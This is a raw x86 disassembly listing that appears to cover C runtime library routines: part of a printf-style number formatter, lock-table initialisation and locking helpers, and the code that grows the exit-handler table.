  40550b:	50                   	push   %eax
  40550c:	ff b5 9c fd ff ff    	push   -0x264(%ebp)
  405512:	8d 85 88 fd ff ff    	lea    -0x278(%ebp),%eax
  405518:	53                   	push   %ebx
  405519:	50                   	push   %eax
  40551a:	ff 35 50 db 40 00    	push   0x40db50
  405520:	e8 a8 d4 ff ff       	call   0x4029cd
  405525:	59                   	pop    %ecx
  405526:	ff d0                	call   *%eax
  405528:	8b bd f0 fd ff ff    	mov    -0x210(%ebp),%edi
  40552e:	83 c4 1c             	add    $0x1c,%esp
  405531:	81 e7 80 00 00 00    	and    $0x80,%edi
  405537:	74 21                	je     0x40555a
  405539:	83 bd e8 fd ff ff 00 	cmpl   $0x0,-0x218(%ebp)
  405540:	75 18                	jne    0x40555a
  405542:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
  405548:	50                   	push   %eax
  405549:	53                   	push   %ebx
  40554a:	ff 35 5c db 40 00    	push   0x40db5c
  405550:	e8 78 d4 ff ff       	call   0x4029cd
  405555:	59                   	pop    %ecx
  405556:	ff d0                	call   *%eax
  405558:	59                   	pop    %ecx
  405559:	59                   	pop    %ecx
  40555a:	80 bd ef fd ff ff 67 	cmpb   $0x67,-0x211(%ebp)
  405561:	75 1c                	jne    0x40557f
  405563:	85 ff                	test   %edi,%edi
  405565:	75 18                	jne    0x40557f
  405567:	8d 85 b0 fd ff ff    	lea    -0x250(%ebp),%eax
  40556d:	50                   	push   %eax
  40556e:	53                   	push   %ebx
  40556f:	ff 35 58 db 40 00    	push   0x40db58
  405575:	e8 53 d4 ff ff       	call   0x4029cd
  40557a:	59                   	pop    %ecx
  40557b:	ff d0                	call   *%eax
  40557d:	59                   	pop    %ecx
  40557e:	59                   	pop    %ecx
  40557f:	80 3b 2d             	cmpb   $0x2d,(%ebx)
  405582:	75 11                	jne    0x405595
  405584:	81 8d f0 fd ff ff 00 	orl    $0x100,-0x210(%ebp)
  40558b:	01 00 00 
  40558e:	43                   	inc    %ebx
  40558f:	89 9d e4 fd ff ff    	mov    %ebx,-0x21c(%ebp)
  405595:	53                   	push   %ebx
  405596:	e9 05 fe ff ff       	jmp    0x4053a0
  40559b:	89 b5 e8 fd ff ff    	mov    %esi,-0x218(%ebp)
  4055a1:	89 8d a4 fd ff ff    	mov    %ecx,-0x25c(%ebp)
  4055a7:	eb 24                	jmp    0x4055cd
  4055a9:	83 e8 73             	sub    $0x73,%eax
  4055ac:	0f 84 bb fc ff ff    	je     0x40526d
  4055b2:	48                   	dec    %eax
  4055b3:	48                   	dec    %eax
  4055b4:	0f 84 8b fe ff ff    	je     0x405445
  4055ba:	83 e8 03             	sub    $0x3,%eax
  4055bd:	0f 85 b7 01 00 00    	jne    0x40577a
  4055c3:	c7 85 a4 fd ff ff 27 	movl   $0x27,-0x25c(%ebp)
  4055ca:	00 00 00 
  4055cd:	f6 85 f0 fd ff ff 80 	testb  $0x80,-0x210(%ebp)
  4055d4:	c7 85 e0 fd ff ff 10 	movl   $0x10,-0x220(%ebp)
  4055db:	00 00 00 
  4055de:	0f 84 6b fe ff ff    	je     0x40544f
  4055e4:	8a 85 a4 fd ff ff    	mov    -0x25c(%ebp),%al
  4055ea:	04 51                	add    $0x51,%al
  4055ec:	c6 85 d4 fd ff ff 30 	movb   $0x30,-0x22c(%ebp)
  4055f3:	88 85 d5 fd ff ff    	mov    %al,-0x22b(%ebp)
  4055f9:	c7 85 d0 fd ff ff 02 	movl   $0x2,-0x230(%ebp)
  405600:	00 00 00 
  405603:	e9 47 fe ff ff       	jmp    0x40544f
  405608:	f7 c1 00 10 00 00    	test   $0x1000,%ecx
  40560e:	0f 85 4d fe ff ff    	jne    0x405461
  405614:	83 c7 04             	add    $0x4,%edi
  405617:	f6 c1 20             	test   $0x20,%cl
  40561a:	74 18                	je     0x405634
  40561c:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  405622:	f6 c1 40             	test   $0x40,%cl
  405625:	74 06                	je     0x40562d
  405627:	0f bf 47 fc          	movswl -0x4(%edi),%eax
  40562b:	eb 04                	jmp    0x405631
  40562d:	0f b7 47 fc          	movzwl -0x4(%edi),%eax
  405631:	99                   	cltd
  405632:	eb 13                	jmp    0x405647
  405634:	8b 47 fc             	mov    -0x4(%edi),%eax
  405637:	f6 c1 40             	test   $0x40,%cl
  40563a:	74 03                	je     0x40563f
  40563c:	99                   	cltd
  40563d:	eb 02                	jmp    0x405641
  40563f:	33 d2                	xor    %edx,%edx
  405641:	89 bd dc fd ff ff    	mov    %edi,-0x224(%ebp)
  405647:	f6 c1 40             	test   $0x40,%cl
  40564a:	74 1b                	je     0x405667
  40564c:	85 d2                	test   %edx,%edx
  40564e:	7f 17                	jg     0x405667
  405650:	7c 04                	jl     0x405656
  405652:	85 c0                	test   %eax,%eax
  405654:	73 11                	jae    0x405667
  405656:	f7 d8                	neg    %eax
  405658:	83 d2 00             	adc    $0x0,%edx
  40565b:	f7 da                	neg    %edx
  40565d:	81 8d f0 fd ff ff 00 	orl    $0x100,-0x210(%ebp)
  405664:	01 00 00 
  405667:	f7 85 f0 fd ff ff 00 	testl  $0x9000,-0x210(%ebp)
  40566e:	90 00 00 
  405671:	8b da                	mov    %edx,%ebx
  405673:	8b f8                	mov    %eax,%edi
  405675:	75 02                	jne    0x405679
  405677:	33 db                	xor    %ebx,%ebx
  405679:	83 bd e8 fd ff ff 00 	cmpl   $0x0,-0x218(%ebp)
  405680:	7d 0c                	jge    0x40568e
  405682:	c7 85 e8 fd ff ff 01 	movl   $0x1,-0x218(%ebp)
  405689:	00 00 00 
  40568c:	eb 1a                	jmp    0x4056a8
  40568e:	83 a5 f0 fd ff ff f7 	andl   $0xfffffff7,-0x210(%ebp)
  405695:	b8 00 02 00 00       	mov    $0x200,%eax
  40569a:	39 85 e8 fd ff ff    	cmp    %eax,-0x218(%ebp)
  4056a0:	7e 06                	jle    0x4056a8
  4056a2:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  4056a8:	8b c7                	mov    %edi,%eax
  4056aa:	0b c3                	or     %ebx,%eax
  4056ac:	75 06                	jne    0x4056b4
  4056ae:	21 85 d0 fd ff ff    	and    %eax,-0x230(%ebp)
  4056b4:	8d 75 f3             	lea    -0xd(%ebp),%esi
  4056b7:	8b 85 e8 fd ff ff    	mov    -0x218(%ebp),%eax
  4056bd:	ff 8d e8 fd ff ff    	decl   -0x218(%ebp)
  4056c3:	85 c0                	test   %eax,%eax
  4056c5:	7f 06                	jg     0x4056cd
  4056c7:	8b c7                	mov    %edi,%eax
  4056c9:	0b c3                	or     %ebx,%eax
  4056cb:	74 2d                	je     0x4056fa
  4056cd:	8b 85 e0 fd ff ff    	mov    -0x220(%ebp),%eax
  4056d3:	99                   	cltd
  4056d4:	52                   	push   %edx
  4056d5:	50                   	push   %eax
  4056d6:	53                   	push   %ebx
  4056d7:	57                   	push   %edi
  4056d8:	e8 23 f5 ff ff       	call   0x404c00
  4056dd:	83 c1 30             	add    $0x30,%ecx
  4056e0:	83 f9 39             	cmp    $0x39,%ecx
  4056e3:	89 9d 9c fd ff ff    	mov    %ebx,-0x264(%ebp)
  4056e9:	8b f8                	mov    %eax,%edi
  4056eb:	8b da                	mov    %edx,%ebx
  4056ed:	7e 06                	jle    0x4056f5
  4056ef:	03 8d a4 fd ff ff    	add    -0x25c(%ebp),%ecx
  4056f5:	88 0e                	mov    %cl,(%esi)
  4056f7:	4e                   	dec    %esi
  4056f8:	eb bd                	jmp    0x4056b7
  4056fa:	8d 45 f3             	lea    -0xd(%ebp),%eax
  4056fd:	2b c6                	sub    %esi,%eax
  4056ff:	46                   	inc    %esi
  405700:	f7 85 f0 fd ff ff 00 	testl  $0x200,-0x210(%ebp)
  405707:	02 00 00 
  40570a:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  405710:	89 b5 e4 fd ff ff    	mov    %esi,-0x21c(%ebp)
  405716:	74 62                	je     0x40577a
  405718:	85 c0                	test   %eax,%eax
  40571a:	74 07                	je     0x405723
  40571c:	8b ce                	mov    %esi,%ecx
  40571e:	80 39 30             	cmpb   $0x30,(%ecx)
  405721:	74 57                	je     0x40577a
  405723:	ff 8d e4 fd ff ff    	decl   -0x21c(%ebp)
  405729:	8b 8d e4 fd ff ff    	mov    -0x21c(%ebp),%ecx
  40572f:	c6 01 30             	movb   $0x30,(%ecx)
  405732:	40                   	inc    %eax
  405733:	eb 3f                	jmp    0x405774
  405735:	49                   	dec    %ecx
  405736:	66 83 38 00          	cmpw   $0x0,(%eax)
  40573a:	74 06                	je     0x405742
  40573c:	40                   	inc    %eax
  40573d:	40                   	inc    %eax
  40573e:	85 c9                	test   %ecx,%ecx
  405740:	75 f3                	jne    0x405735
  405742:	2b 85 e4 fd ff ff    	sub    -0x21c(%ebp),%eax
  405748:	d1 f8                	sar    $1,%eax
  40574a:	eb 28                	jmp    0x405774
  40574c:	85 ff                	test   %edi,%edi
  40574e:	75 0b                	jne    0x40575b
  405750:	a1 04 d0 40 00       	mov    0x40d004,%eax
  405755:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  40575b:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  405761:	eb 07                	jmp    0x40576a
  405763:	49                   	dec    %ecx
  405764:	80 38 00             	cmpb   $0x0,(%eax)
  405767:	74 05                	je     0x40576e
  405769:	40                   	inc    %eax
  40576a:	85 c9                	test   %ecx,%ecx
  40576c:	75 f5                	jne    0x405763
  40576e:	2b 85 e4 fd ff ff    	sub    -0x21c(%ebp),%eax
  405774:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  40577a:	83 bd a8 fd ff ff 00 	cmpl   $0x0,-0x258(%ebp)
  405781:	0f 85 5c 01 00 00    	jne    0x4058e3
  405787:	8b 85 f0 fd ff ff    	mov    -0x210(%ebp),%eax
  40578d:	a8 40                	test   $0x40,%al
  40578f:	74 32                	je     0x4057c3
  405791:	a9 00 01 00 00       	test   $0x100,%eax
  405796:	74 09                	je     0x4057a1
  405798:	c6 85 d4 fd ff ff 2d 	movb   $0x2d,-0x22c(%ebp)
  40579f:	eb 18                	jmp    0x4057b9
  4057a1:	a8 01                	test   $0x1,%al
  4057a3:	74 09                	je     0x4057ae
  4057a5:	c6 85 d4 fd ff ff 2b 	movb   $0x2b,-0x22c(%ebp)
  4057ac:	eb 0b                	jmp    0x4057b9
  4057ae:	a8 02                	test   $0x2,%al
  4057b0:	74 11                	je     0x4057c3
  4057b2:	c6 85 d4 fd ff ff 20 	movb   $0x20,-0x22c(%ebp)
  4057b9:	c7 85 d0 fd ff ff 01 	movl   $0x1,-0x230(%ebp)
  4057c0:	00 00 00 
  4057c3:	8b 9d cc fd ff ff    	mov    -0x234(%ebp),%ebx
  4057c9:	2b 9d e0 fd ff ff    	sub    -0x220(%ebp),%ebx
  4057cf:	2b 9d d0 fd ff ff    	sub    -0x230(%ebp),%ebx
  4057d5:	f6 85 f0 fd ff ff 0c 	testb  $0xc,-0x210(%ebp)
  4057dc:	75 17                	jne    0x4057f5
  4057de:	ff b5 a0 fd ff ff    	push   -0x260(%ebp)
  4057e4:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  4057ea:	53                   	push   %ebx
  4057eb:	6a 20                	push   $0x20
  4057ed:	e8 5b f5 ff ff       	call   0x404d4d
  4057f2:	83 c4 0c             	add    $0xc,%esp
  4057f5:	ff b5 d0 fd ff ff    	push   -0x230(%ebp)
  4057fb:	8b bd a0 fd ff ff    	mov    -0x260(%ebp),%edi
  405801:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  405807:	8d 8d d4 fd ff ff    	lea    -0x22c(%ebp),%ecx
  40580d:	e8 61 f5 ff ff       	call   0x404d73
  405812:	f6 85 f0 fd ff ff 08 	testb  $0x8,-0x210(%ebp)
  405819:	59                   	pop    %ecx
  40581a:	74 1b                	je     0x405837
  40581c:	f6 85 f0 fd ff ff 04 	testb  $0x4,-0x210(%ebp)
  405823:	75 12                	jne    0x405837
  405825:	57                   	push   %edi
  405826:	53                   	push   %ebx
  405827:	6a 30                	push   $0x30
  405829:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  40582f:	e8 19 f5 ff ff       	call   0x404d4d
  405834:	83 c4 0c             	add    $0xc,%esp
  405837:	83 bd c8 fd ff ff 00 	cmpl   $0x0,-0x238(%ebp)
  40583e:	8b 85 e0 fd ff ff    	mov    -0x220(%ebp),%eax
  405844:	74 66                	je     0x4058ac
  405846:	85 c0                	test   %eax,%eax
  405848:	7e 62                	jle    0x4058ac
  40584a:	8b b5 e4 fd ff ff    	mov    -0x21c(%ebp),%esi
  405850:	89 85 9c fd ff ff    	mov    %eax,-0x264(%ebp)
  405856:	0f b7 06             	movzwl (%esi),%eax
  405859:	ff 8d 9c fd ff ff    	decl   -0x264(%ebp)
  40585f:	50                   	push   %eax
  405860:	6a 06                	push   $0x6
  405862:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405865:	50                   	push   %eax
  405866:	8d 85 90 fd ff ff    	lea    -0x270(%ebp),%eax
  40586c:	46                   	inc    %esi
  40586d:	50                   	push   %eax
  40586e:	46                   	inc    %esi
  40586f:	e8 13 f3 ff ff       	call   0x404b87
  405874:	83 c4 10             	add    $0x10,%esp
  405877:	85 c0                	test   %eax,%eax
  405879:	75 28                	jne    0x4058a3
  40587b:	39 85 90 fd ff ff    	cmp    %eax,-0x270(%ebp)
  405881:	74 20                	je     0x4058a3
  405883:	ff b5 90 fd ff ff    	push   -0x270(%ebp)
  405889:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  40588f:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  405892:	e8 dc f4 ff ff       	call   0x404d73
  405897:	83 bd 9c fd ff ff 00 	cmpl   $0x0,-0x264(%ebp)
  40589e:	59                   	pop    %ecx
  40589f:	75 b5                	jne    0x405856
  4058a1:	eb 1c                	jmp    0x4058bf
  4058a3:	83 8d d8 fd ff ff ff 	orl    $0xffffffff,-0x228(%ebp)
  4058aa:	eb 13                	jmp    0x4058bf
  4058ac:	8b 8d e4 fd ff ff    	mov    -0x21c(%ebp),%ecx
  4058b2:	50                   	push   %eax
  4058b3:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  4058b9:	e8 b5 f4 ff ff       	call   0x404d73
  4058be:	59                   	pop    %ecx
  4058bf:	83 bd d8 fd ff ff 00 	cmpl   $0x0,-0x228(%ebp)
  4058c6:	7c 1b                	jl     0x4058e3
  4058c8:	f6 85 f0 fd ff ff 04 	testb  $0x4,-0x210(%ebp)
  4058cf:	74 12                	je     0x4058e3
  4058d1:	57                   	push   %edi
  4058d2:	53                   	push   %ebx
  4058d3:	6a 20                	push   $0x20
  4058d5:	8d 85 d8 fd ff ff    	lea    -0x228(%ebp),%eax
  4058db:	e8 6d f4 ff ff       	call   0x404d4d
  4058e0:	83 c4 0c             	add    $0xc,%esp
  4058e3:	83 bd ac fd ff ff 00 	cmpl   $0x0,-0x254(%ebp)
  4058ea:	74 13                	je     0x4058ff
  4058ec:	ff b5 ac fd ff ff    	push   -0x254(%ebp)
  4058f2:	e8 f4 ee ff ff       	call   0x4047eb
  4058f7:	83 a5 ac fd ff ff 00 	andl   $0x0,-0x254(%ebp)
  4058fe:	59                   	pop    %ecx
  4058ff:	8b 9d c4 fd ff ff    	mov    -0x23c(%ebp),%ebx
  405905:	8a 03                	mov    (%ebx),%al
  405907:	88 85 ef fd ff ff    	mov    %al,-0x211(%ebp)
  40590d:	84 c0                	test   %al,%al
  40590f:	74 0d                	je     0x40591e
  405911:	8b bd dc fd ff ff    	mov    -0x224(%ebp),%edi
  405917:	8a d0                	mov    %al,%dl
  405919:	e9 d8 f5 ff ff       	jmp    0x404ef6
  40591e:	33 f6                	xor    %esi,%esi
  405920:	39 b5 c0 fd ff ff    	cmp    %esi,-0x240(%ebp)
  405926:	74 1e                	je     0x405946
  405928:	83 bd c0 fd ff ff 07 	cmpl   $0x7,-0x240(%ebp)
  40592f:	74 15                	je     0x405946
  405931:	e8 49 c0 ff ff       	call   0x40197f
  405936:	56                   	push   %esi
  405937:	56                   	push   %esi
  405938:	56                   	push   %esi
  405939:	56                   	push   %esi
  40593a:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  405940:	56                   	push   %esi
  405941:	e9 f7 f4 ff ff       	jmp    0x404e3d
  405946:	80 bd bc fd ff ff 00 	cmpb   $0x0,-0x244(%ebp)
  40594d:	74 0a                	je     0x405959
  40594f:	8b 85 b8 fd ff ff    	mov    -0x248(%ebp),%eax
  405955:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  405959:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  40595f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405962:	5f                   	pop    %edi
  405963:	5e                   	pop    %esi
  405964:	33 cd                	xor    %ebp,%ecx
  405966:	5b                   	pop    %ebx
  405967:	e8 83 f2 ff ff       	call   0x404bef
  40596c:	c9                   	leave
  40596d:	c3                   	ret
  40596e:	8b ff                	mov    %edi,%edi
  405970:	5a                   	pop    %edx
  405971:	51                   	push   %ecx
  405972:	40                   	inc    %eax
  405973:	00 59 4f             	add    %bl,0x4f(%ecx)
  405976:	40                   	inc    %eax
  405977:	00 8b 4f 40 00 e7    	add    %cl,-0x18ffbfb1(%ebx)
  40597d:	4f                   	dec    %edi
  40597e:	40                   	inc    %eax
  40597f:	00 33                	add    %dh,(%ebx)
  405981:	50                   	push   %eax
  405982:	40                   	inc    %eax
  405983:	00 3f                	add    %bh,(%edi)
  405985:	50                   	push   %eax
  405986:	40                   	inc    %eax
  405987:	00 85 50 40 00 b5    	add    %al,-0x4affbfb0(%ebp)
  40598d:	51                   	push   %ecx
  40598e:	40                   	inc    %eax
  40598f:	00 6a 08             	add    %ch,0x8(%edx)
  405992:	68 e8 b6 40 00       	push   $0x40b6e8
  405997:	e8 84 d5 ff ff       	call   0x402f20
  40599c:	e8 78 d2 ff ff       	call   0x402c19
  4059a1:	8b 40 78             	mov    0x78(%eax),%eax
  4059a4:	85 c0                	test   %eax,%eax
  4059a6:	74 16                	je     0x4059be
  4059a8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4059ac:	ff d0                	call   *%eax
  4059ae:	eb 07                	jmp    0x4059b7
  4059b0:	33 c0                	xor    %eax,%eax
  4059b2:	40                   	inc    %eax
  4059b3:	c3                   	ret
  4059b4:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4059b7:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4059be:	e8 7d 33 00 00       	call   0x408d40
  4059c3:	e8 9d d5 ff ff       	call   0x402f65
  4059c8:	c3                   	ret
  4059c9:	68 90 59 40 00       	push   $0x405990
  4059ce:	e8 7f cf ff ff       	call   0x402952
  4059d3:	59                   	pop    %ecx
  4059d4:	a3 cc e3 40 00       	mov    %eax,0x40e3cc
  4059d9:	c3                   	ret
  4059da:	8b ff                	mov    %edi,%edi
  4059dc:	56                   	push   %esi
  4059dd:	57                   	push   %edi
  4059de:	33 f6                	xor    %esi,%esi
  4059e0:	bf d0 e3 40 00       	mov    $0x40e3d0,%edi
  4059e5:	83 3c f5 74 db 40 00 	cmpl   $0x1,0x40db74(,%esi,8)
  4059ec:	01 
  4059ed:	75 1e                	jne    0x405a0d
  4059ef:	8d 04 f5 70 db 40 00 	lea    0x40db70(,%esi,8),%eax
  4059f6:	89 38                	mov    %edi,(%eax)
  4059f8:	68 a0 0f 00 00       	push   $0xfa0
  4059fd:	ff 30                	push   (%eax)
  4059ff:	83 c7 18             	add    $0x18,%edi
  405a02:	e8 55 06 00 00       	call   0x40605c
  405a07:	59                   	pop    %ecx
  405a08:	59                   	pop    %ecx
  405a09:	85 c0                	test   %eax,%eax
  405a0b:	74 0c                	je     0x405a19
  405a0d:	46                   	inc    %esi
  405a0e:	83 fe 24             	cmp    $0x24,%esi
  405a11:	7c d2                	jl     0x4059e5
  405a13:	33 c0                	xor    %eax,%eax
  405a15:	40                   	inc    %eax
  405a16:	5f                   	pop    %edi
  405a17:	5e                   	pop    %esi
  405a18:	c3                   	ret
  405a19:	83 24 f5 70 db 40 00 	andl   $0x0,0x40db70(,%esi,8)
  405a20:	00 
  405a21:	33 c0                	xor    %eax,%eax
  405a23:	eb f1                	jmp    0x405a16
  405a25:	8b ff                	mov    %edi,%edi
  405a27:	53                   	push   %ebx
  405a28:	8b 1d 9c a0 40 00    	mov    0x40a09c,%ebx
  405a2e:	56                   	push   %esi
  405a2f:	be 70 db 40 00       	mov    $0x40db70,%esi
  405a34:	57                   	push   %edi
  405a35:	8b 3e                	mov    (%esi),%edi
  405a37:	85 ff                	test   %edi,%edi
  405a39:	74 13                	je     0x405a4e
  405a3b:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  405a3f:	74 0d                	je     0x405a4e
  405a41:	57                   	push   %edi
  405a42:	ff d3                	call   *%ebx
  405a44:	57                   	push   %edi
  405a45:	e8 a1 ed ff ff       	call   0x4047eb
  405a4a:	83 26 00             	andl   $0x0,(%esi)
  405a4d:	59                   	pop    %ecx
  405a4e:	83 c6 08             	add    $0x8,%esi
  405a51:	81 fe 90 dc 40 00    	cmp    $0x40dc90,%esi
  405a57:	7c dc                	jl     0x405a35
  405a59:	be 70 db 40 00       	mov    $0x40db70,%esi
  405a5e:	5f                   	pop    %edi
  405a5f:	8b 06                	mov    (%esi),%eax
  405a61:	85 c0                	test   %eax,%eax
  405a63:	74 09                	je     0x405a6e
  405a65:	83 7e 04 01          	cmpl   $0x1,0x4(%esi)
  405a69:	75 03                	jne    0x405a6e
  405a6b:	50                   	push   %eax
  405a6c:	ff d3                	call   *%ebx
  405a6e:	83 c6 08             	add    $0x8,%esi
  405a71:	81 fe 90 dc 40 00    	cmp    $0x40dc90,%esi
  405a77:	7c e6                	jl     0x405a5f
  405a79:	5e                   	pop    %esi
  405a7a:	5b                   	pop    %ebx
  405a7b:	c3                   	ret
  405a7c:	8b ff                	mov    %edi,%edi
  405a7e:	55                   	push   %ebp
  405a7f:	8b ec                	mov    %esp,%ebp
  405a81:	8b 45 08             	mov    0x8(%ebp),%eax
  405a84:	ff 34 c5 70 db 40 00 	push   0x40db70(,%eax,8)
  405a8b:	ff 15 e8 a0 40 00    	call   *0x40a0e8
  405a91:	5d                   	pop    %ebp
  405a92:	c3                   	ret
  405a93:	6a 0c                	push   $0xc
  405a95:	68 08 b7 40 00       	push   $0x40b708
  405a9a:	e8 81 d4 ff ff       	call   0x402f20
  405a9f:	33 ff                	xor    %edi,%edi
  405aa1:	47                   	inc    %edi
  405aa2:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  405aa5:	33 db                	xor    %ebx,%ebx
  405aa7:	39 1d 7c e3 40 00    	cmp    %ebx,0x40e37c
  405aad:	75 18                	jne    0x405ac7
  405aaf:	e8 9b c5 ff ff       	call   0x40204f
  405ab4:	6a 1e                	push   $0x1e
  405ab6:	e8 e9 c3 ff ff       	call   0x401ea4
  405abb:	68 ff 00 00 00       	push   $0xff
  405ac0:	e8 2b c1 ff ff       	call   0x401bf0
  405ac5:	59                   	pop    %ecx
  405ac6:	59                   	pop    %ecx
  405ac7:	8b 75 08             	mov    0x8(%ebp),%esi
  405aca:	8d 34 f5 70 db 40 00 	lea    0x40db70(,%esi,8),%esi
  405ad1:	39 1e                	cmp    %ebx,(%esi)
  405ad3:	74 04                	je     0x405ad9
  405ad5:	8b c7                	mov    %edi,%eax
  405ad7:	eb 6e                	jmp    0x405b47
  405ad9:	6a 18                	push   $0x18
  405adb:	e8 ba ed ff ff       	call   0x40489a
  405ae0:	59                   	pop    %ecx
  405ae1:	8b f8                	mov    %eax,%edi
  405ae3:	3b fb                	cmp    %ebx,%edi
  405ae5:	75 0f                	jne    0x405af6
  405ae7:	e8 93 be ff ff       	call   0x40197f
  405aec:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  405af2:	33 c0                	xor    %eax,%eax
  405af4:	eb 51                	jmp    0x405b47
  405af6:	6a 0a                	push   $0xa
  405af8:	e8 59 00 00 00       	call   0x405b56
  405afd:	59                   	pop    %ecx
  405afe:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405b01:	39 1e                	cmp    %ebx,(%esi)
  405b03:	75 2c                	jne    0x405b31
  405b05:	68 a0 0f 00 00       	push   $0xfa0
  405b0a:	57                   	push   %edi
  405b0b:	e8 4c 05 00 00       	call   0x40605c
  405b10:	59                   	pop    %ecx
  405b11:	59                   	pop    %ecx
  405b12:	85 c0                	test   %eax,%eax
  405b14:	75 17                	jne    0x405b2d
  405b16:	57                   	push   %edi
  405b17:	e8 cf ec ff ff       	call   0x4047eb
  405b1c:	59                   	pop    %ecx
  405b1d:	e8 5d be ff ff       	call   0x40197f
  405b22:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  405b28:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  405b2b:	eb 0b                	jmp    0x405b38
  405b2d:	89 3e                	mov    %edi,(%esi)
  405b2f:	eb 07                	jmp    0x405b38
  405b31:	57                   	push   %edi
  405b32:	e8 b4 ec ff ff       	call   0x4047eb
  405b37:	59                   	pop    %ecx
  405b38:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405b3f:	e8 09 00 00 00       	call   0x405b4d
  405b44:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405b47:	e8 19 d4 ff ff       	call   0x402f65
  405b4c:	c3                   	ret
  405b4d:	6a 0a                	push   $0xa
  405b4f:	e8 28 ff ff ff       	call   0x405a7c
  405b54:	59                   	pop    %ecx
  405b55:	c3                   	ret
  405b56:	8b ff                	mov    %edi,%edi
  405b58:	55                   	push   %ebp
  405b59:	8b ec                	mov    %esp,%ebp
  405b5b:	8b 45 08             	mov    0x8(%ebp),%eax
  405b5e:	56                   	push   %esi
  405b5f:	8d 34 c5 70 db 40 00 	lea    0x40db70(,%eax,8),%esi
  405b66:	83 3e 00             	cmpl   $0x0,(%esi)
  405b69:	75 13                	jne    0x405b7e
  405b6b:	50                   	push   %eax
  405b6c:	e8 22 ff ff ff       	call   0x405a93
  405b71:	59                   	pop    %ecx
  405b72:	85 c0                	test   %eax,%eax
  405b74:	75 08                	jne    0x405b7e
  405b76:	6a 11                	push   $0x11
  405b78:	e8 1f c0 ff ff       	call   0x401b9c
  405b7d:	59                   	pop    %ecx
  405b7e:	ff 36                	push   (%esi)
  405b80:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  405b86:	5e                   	pop    %esi
  405b87:	5d                   	pop    %ebp
  405b88:	c3                   	ret
  405b89:	8b ff                	mov    %edi,%edi
  405b8b:	55                   	push   %ebp
  405b8c:	8b ec                	mov    %esp,%ebp
  405b8e:	51                   	push   %ecx
  405b8f:	53                   	push   %ebx
  405b90:	56                   	push   %esi
  405b91:	57                   	push   %edi
  405b92:	ff 35 c8 fa 40 00    	push   0x40fac8
  405b98:	e8 30 ce ff ff       	call   0x4029cd
  405b9d:	ff 35 c4 fa 40 00    	push   0x40fac4
  405ba3:	8b f8                	mov    %eax,%edi
  405ba5:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405ba8:	e8 20 ce ff ff       	call   0x4029cd
  405bad:	8b f0                	mov    %eax,%esi
  405baf:	59                   	pop    %ecx
  405bb0:	59                   	pop    %ecx
  405bb1:	3b f7                	cmp    %edi,%esi
  405bb3:	0f 82 83 00 00 00    	jb     0x405c3c
  405bb9:	8b de                	mov    %esi,%ebx
  405bbb:	2b df                	sub    %edi,%ebx
  405bbd:	8d 43 04             	lea    0x4(%ebx),%eax
  405bc0:	83 f8 04             	cmp    $0x4,%eax
  405bc3:	72 77                	jb     0x405c3c
  405bc5:	57                   	push   %edi
  405bc6:	e8 8c 32 00 00       	call   0x408e57
  405bcb:	8b f8                	mov    %eax,%edi
  405bcd:	8d 43 04             	lea    0x4(%ebx),%eax
  405bd0:	59                   	pop    %ecx
  405bd1:	3b f8                	cmp    %eax,%edi
  405bd3:	73 48                	jae    0x405c1d
  405bd5:	b8 00 08 00 00       	mov    $0x800,%eax
  405bda:	3b f8                	cmp    %eax,%edi
  405bdc:	73 02                	jae    0x405be0
  405bde:	8b c7                	mov    %edi,%eax
  405be0:	03 c7                	add    %edi,%eax
  405be2:	3b c7                	cmp    %edi,%eax
  405be4:	72 0f                	jb     0x405bf5
  405be6:	50                   	push   %eax
  405be7:	ff 75 fc             	push   -0x4(%ebp)
  405bea:	e8 3c ed ff ff       	call   0x40492b
  405bef:	59                   	pop    %ecx
  405bf0:	59                   	pop    %ecx
  405bf1:	85 c0                	test   %eax,%eax
  405bf3:	75 16                	jne    0x405c0b
  405bf5:	8d 47 10             	lea    0x10(%edi),%eax
  405bf8:	3b c7                	cmp    %edi,%eax
  405bfa:	72 40                	jb     0x405c3c
  405bfc:	50                   	push   %eax
  405bfd:	ff 75 fc             	push   -0x4(%ebp)
  405c00:	e8 26 ed ff ff       	call   0x40492b
  405c05:	59                   	pop    %ecx
  405c06:	59                   	pop    %ecx
  405c07:	85 c0                	test   %eax,%eax
  405c09:	74 31                	je     0x405c3c
  405c0b:	c1 fb 02             	sar    $0x2,%ebx
  405c0e:	50                   	push   %eax
  405c0f:	8d 34 98             	lea    (%eax,%ebx,4),%esi
  405c12:	e8 3b cd ff ff       	call   0x402952
  405c17:	59                   	pop    %ecx
  405c18:	a3 c8 fa 40 00       	mov    %eax,0x40fac8
  405c1d:	ff 75 08             	push   0x8(%ebp)
  405c20:	e8 2d cd ff ff       	call   0x402952
  405c25:	89 06                	mov    %eax,(%esi)
  405c27:	83 c6 04             	add    $0x4,%esi
